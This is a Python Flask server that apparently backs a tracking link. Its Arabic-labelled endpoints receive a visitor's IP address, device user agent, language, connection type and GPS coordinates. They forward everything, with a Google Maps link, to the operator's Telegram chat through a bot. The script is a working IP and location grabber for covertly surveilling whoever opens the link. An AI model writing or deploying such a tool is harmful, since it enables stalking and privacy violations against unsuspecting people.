from flask import Flask, request, jsonify
import telebot
import os

bot = telebot.TeleBot(os.environ.get("TELEGRAM_TOKEN"))
chat_id = os.environ.get("CHAT_ID")

app = Flask(__name__)

@app.route('/')
def index():
    return open("index.html", encoding="utf-8").read()

@app.route('/get_ip')
def get_ip():
    return request.remote_addr

@app.route('/report', methods=['POST'])
def report():
    data = request.json
    msg = (
        f"📡 تم دخول رابط جديد:\n\n"
        f"🌐 IP: {data.get('ip')}\n"
        f"🧠 الجهاز: {data.get('userAgent')}\n"
        f"🗣 اللغة: {data.get('language')}\n"
        f"🔌 الاتصال: {data.get('connection')}"
    )
    bot.send_message(chat_id, msg)
    return jsonify(status="ok")

@app.route('/geo', methods=['POST'])
def geo():
    data = request.json
    lat = data.get("lat")
    lon = data.get("lon")
    if lat and lon:
        location_url = f"https://maps.google.com/?q={lat},{lon}"
        bot.send_message(chat_id, f"📍 الموقع الجغرافي:\n{location_url}")
    return jsonify(status="geo-ok")

if __name__ == "__main__":
    import os
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)